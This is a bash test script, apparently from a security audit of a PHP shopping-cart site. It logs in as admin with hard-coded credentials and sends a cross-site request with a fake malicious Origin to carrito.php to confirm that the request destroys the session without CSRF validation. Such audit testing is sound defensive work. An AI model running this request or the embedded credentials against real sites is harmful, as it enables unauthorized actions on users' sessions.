#!/usr/bin/env bash
# CP-CART-002: CSRF en operacion de limpiar carrito (op=3 / session_destroy sin verificar origen)
set -euo pipefail
DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$DIR/00_common.sh"
OUT="$DIR/../resultados/raw_CP-CART-002.txt"
JAR=/tmp/audit-mysql-run/cookies_cart002.txt
rm -f "$JAR"

{
  echo "=== CP-CART-002: CSRF en carrito.php (op=3) ==="
  echo "--- Paso 1: login valido (para tener \$_SESSION['nombre'] como marcador verificable de sesion activa) ---"
  curl -s -c "$JAR" -b "$JAR" -o /dev/null "$BASE_URL/index.php"
  curl -s -c "$JAR" -b "$JAR" -o /dev/null -X POST "$BASE_URL/setup/procesalogin.php" \
    --data-urlencode "frmusuario=admin@gmail.com" --data-urlencode "frmpassword=admin01"
  echo "Login realizado."
  echo
  echo "--- Estado ANTES del ataque CSRF: index.php debe mostrar 'Bienvenido :Administrador' ---"
  curl -s -b "$JAR" "$BASE_URL/index.php" | grep -o "Bienvenido :Administrador" || echo "(no aparece, revisar)"
  echo
  echo "--- Paso 2: simular peticion CSRF: POST op=3 con Origin de un sitio externo (carrito.php no valida Origin/Referer/token CSRF), reutilizando solo la cookie de sesion valida robada/heredada ---"
  curl -s -i -b "$JAR" -c "$JAR" -H "Origin: https://sitio-malicioso-externo.example" -X POST "$BASE_URL/carrito.php" \
    --data-urlencode "op=3"
  echo
  echo "--- Paso 3: verificar si la sesion fue destruida: con la MISMA cookie PHPSESSID, index.php ya NO debe mostrar 'Bienvenido :Administrador' ---"
  curl -s -b "$JAR" "$BASE_URL/index.php" | grep -o "Bienvenido :Administrador" && echo "SESION SIGUE ACTIVA (no destruida)" || echo "SESION DESTRUIDA: 'Bienvenido :Administrador' ya no aparece con la misma cookie -> CSRF confirmado (op=3 se ejecuto sin validar origen)"
} | tee "$OUT"
